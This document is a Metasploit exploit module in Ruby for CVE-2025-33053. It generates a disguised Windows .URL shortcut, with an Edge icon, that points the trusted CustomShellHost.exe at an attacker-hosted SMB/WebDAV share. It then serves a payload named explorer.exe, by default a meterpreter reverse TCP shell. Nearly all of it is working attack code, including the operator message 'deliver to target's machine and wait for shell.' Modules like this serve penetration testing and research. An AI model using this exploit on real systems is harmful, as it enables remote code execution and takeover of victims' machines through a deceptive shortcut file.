##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::Remote::SMB::Server::HashCapture
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2025-33053 Exploit via Malicious .URL File and WebDAV',
        'Description' => %q{
          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing
          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.
          Optionally, a payload is generated and hosted on a specified WebDAV directory.
          When the victim opens the shortcut, it will attempt to access the WebDAV path,
          potentially resulting in remote code execution via a trusted binary.
        },

        'Author' => [
          'Alexandra Gofman', # vuln research
          'David Driker', # vuln research
          'Dev Bui Hieu' # module dev
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-06-11',
        'References' => [
          ['CVE', '2025-33053'],
          ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Passive' => true,
        'Targets' => [['Windows (generic)', {}]],
        'DefaultOptions' => {
          'FOLDER_NAME' => 'webdav',
          'FILE_NAME' => 'explorer.exe',
          'DisablePayloadHandler' => false,
          'Payload' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('OUTFILE', [false, 'Output URL file name', '']),
      ], self.class
    )
  end

  def exploit_remote_load
    start_service
    print_status('The SMB service has been started.')

    self.file_contents = generate_payload_exe
  end

  def exploit
    write_url_file
    exploit_remote_load

    stime = Time.now.to_f
    timeout = datastore['ListenerTimeout'].to_i
    loop do
      break if timeout > 0 && (stime + timeout < Time.now.to_f)

      Rex::ThreadSafe.sleep(1)
    end
  end

  def write_url_file
    content = generate_url_content
    outfile = datastore['OUTFILE'].blank? ? %(#{Rex::Text.rand_text_alphanumeric(8)}.url) : datastore['OUTFILE']
    path = store_local('webdav.url', nil, content, outfile)
    print_status("URL file: #{path}, deliver to target's machine and wait for shell.")
  end

  def generate_url_content
    <<~URLFILE
      [InternetShortcut]
      URL=C:\\Windows\\System32\\CustomShellHost.exe
      WorkingDirectory=\\\\#{srvhost}\\#{share}\\#{folder_name}\\
      ShowCommand=7
      IconIndex=13
      IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
      Modified=20F06BA06D07BD014D
    URLFILE
  end
end
